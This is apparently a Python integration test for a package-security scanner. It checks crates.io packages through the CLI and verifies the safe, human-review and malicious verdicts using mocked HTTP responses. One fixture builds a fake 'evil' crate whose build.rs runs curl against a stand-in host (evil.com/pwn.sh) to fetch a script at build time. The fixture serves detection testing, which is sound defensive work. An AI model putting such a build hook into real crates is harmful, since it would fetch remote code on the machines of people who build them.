"""Integration test — crates.io end-to-end through the CLI.

Exercises the Phase-2 path all the way through:

* Clean crate → ``aigate check`` exits SAFE (0) after prefilter (no AI).
* Crate with ``build.rs`` + subprocess → prefilter surfaces HIGH risk signals;
  without AI the exit code is MALICIOUS (2) because the prefilter risk_level is
  HIGH.

No network: we monkey-patch ``httpx.AsyncClient`` to serve canned crate
metadata + tarball bytes, mirroring the existing resolver unit-test pattern.
"""

from __future__ import annotations

import io
import json
import tarfile

import httpx
from click.testing import CliRunner

from aigate.cli import main
from aigate.config import Config
from aigate.resolver import CRATES_API


class _FakeResponse:
    def __init__(self, *, json_data=None, content: bytes = b"", status: int = 200):
        self._json = json_data
        self.content = content
        self.status_code = status

    def raise_for_status(self):
        if self.status_code >= 400:
            raise httpx.HTTPStatusError(
                f"HTTP {self.status_code}",
                request=httpx.Request("GET", "https://crates.io"),
                response=httpx.Response(self.status_code),
            )

    def json(self):
        return self._json


class _FakeAsyncClient:
    def __init__(self, responses):
        self._responses = responses

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return None

    async def get(self, url: str, **_):
        if url not in self._responses:
            raise AssertionError(f"Unexpected URL: {url}")
        return self._responses[url]


def _make_crate(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=path)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _install_fake_client(monkeypatch, responses):
    monkeypatch.setattr(
        "aigate.resolver.httpx.AsyncClient",
        lambda **_: _FakeAsyncClient(responses),
    )


def test_e2e_clean_crate_is_safe(monkeypatch):
    """Clean Rust crate with no build.rs or proc-macro → SAFE (exit 0)."""
    monkeypatch.setattr("aigate.cli.Config.load", lambda: Config.default())

    crate_archive = _make_crate(
        {
            "clean-1.0.0/Cargo.toml": '[package]\nname = "clean"\nversion = "1.0.0"\n',
            "clean-1.0.0/src/lib.rs": 'pub fn greet() -> &\'static str { "hi" }\n',
        }
    )

    responses = {
        f"{CRATES_API}/clean": _FakeResponse(
            json_data={
                "crate": {
                    "name": "clean",
                    "max_stable_version": "1.0.0",
                    "description": "A very clean crate",
                    "repository": "https://github.com/example/clean",
                },
                "versions": [
                    {
                        "num": "1.0.0",
                        "yanked": False,
                        "authors": ["Author"],
                    }
                ],
            }
        ),
        f"{CRATES_API}/clean/1.0.0/download": _FakeResponse(content=crate_archive),
    }
    _install_fake_client(monkeypatch, responses)

    result = CliRunner().invoke(main, ["check", "clean", "-e", "crates", "--skip-ai", "--json"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["decision"] == "safe"
    assert payload["package"]["ecosystem"] == "crates"
    assert payload["package"]["name"] == "clean"


def test_e2e_crates_oversize_archive_sets_source_unavailable(monkeypatch):
    """Phase 3 retrofit: crates archive > 200MB -> NEEDS_HUMAN_REVIEW (exit 1) AND
    ``PrefilterResult.source_unavailable=True``.

    This is the PRD §2.5 S3 "never SAFE on uninspected bytes" gate expressed as
    a structured field rather than a bare signal string (open-questions #10 v2).
    """
    cfg = Config.default()
    # Shrink the cap to 1 byte so the tiny archive blows past it without
    # actually allocating 200MB.
    cfg.resolver.max_archive_size_crates = 1
    monkeypatch.setattr("aigate.cli.Config.load", lambda: cfg)

    archive = _make_crate({"big-1.0.0/Cargo.toml": '[package]\nname = "big"\n'})
    responses = {
        f"{CRATES_API}/big": _FakeResponse(
            json_data={
                "crate": {
                    "name": "big",
                    "max_stable_version": "1.0.0",
                    "description": "",
                },
                "versions": [{"num": "1.0.0", "yanked": False}],
            }
        ),
        f"{CRATES_API}/big/1.0.0/download": _FakeResponse(content=archive),
    }
    _install_fake_client(monkeypatch, responses)

    result = CliRunner().invoke(main, ["check", "big", "-e", "crates", "--skip-ai", "--json"])
    # NEEDS_HUMAN_REVIEW maps to exit 1 via the MEDIUM risk level branch.
    assert result.exit_code == 1, result.output
    payload = _parse_json_from_mixed_output(result.output)
    # Never SAFE on uninspected bytes.
    assert payload["decision"] != "safe"
    prefilter_payload = payload["prefilter"]
    assert prefilter_payload["source_unavailable"] is True
    assert any("archive_oversized" in s for s in prefilter_payload["risk_signals"])


def _parse_json_from_mixed_output(output: str) -> dict:
    """Pull the JSON payload out of CLI output that may have ``console.print``
    warnings prefixed (e.g. "Warning: archive_oversized..."). Finds the first
    ``{`` and parses from there.
    """
    start = output.find("{")
    if start == -1:
        raise AssertionError(f"No JSON payload in output: {output!r}")
    return json.loads(output[start:])


def test_e2e_build_rs_crate_flags_suspicious(monkeypatch):
    """Crate with build.rs + subprocess → prefilter HIGH → exit code 2."""
    monkeypatch.setattr("aigate.cli.Config.load", lambda: Config.default())

    crate_archive = _make_crate(
        {
            "evil-0.1.0/Cargo.toml": '[package]\nname = "evil"\nversion = "0.1.0"\n',
            "evil-0.1.0/build.rs": (
                "use std::process::Command;\n"
                "fn main() {\n"
                '    Command::new("curl").arg("-sSL").arg("https://evil.com/pwn.sh")'
                ".output().unwrap();\n"
                "}\n"
            ),
            "evil-0.1.0/src/lib.rs": "pub fn hello() {}\n",
        }
    )

    responses = {
        f"{CRATES_API}/evil": _FakeResponse(
            json_data={
                "crate": {
                    "name": "evil",
                    "max_stable_version": "0.1.0",
                    "description": "totally not a backdoor",
                },
                "versions": [{"num": "0.1.0", "yanked": False}],
            }
        ),
        f"{CRATES_API}/evil/0.1.0/download": _FakeResponse(content=crate_archive),
    }
    _install_fake_client(monkeypatch, responses)

    result = CliRunner().invoke(main, ["check", "evil", "-e", "crates", "--skip-ai", "--json"])
    # HIGH risk_level from prefilter → MALICIOUS decision (exit 2).
    # (Without AI we can't reach NEEDS_HUMAN_REVIEW via consensus; the
    # prefilter-layer mapping of HIGH → MALICIOUS is the contract.)
    assert result.exit_code == 2, result.output
    payload = json.loads(result.output)
    risk_signals = payload["prefilter"]["risk_signals"]
    assert any("build.rs" in s for s in risk_signals)
    assert any("HIGH" in s for s in risk_signals)
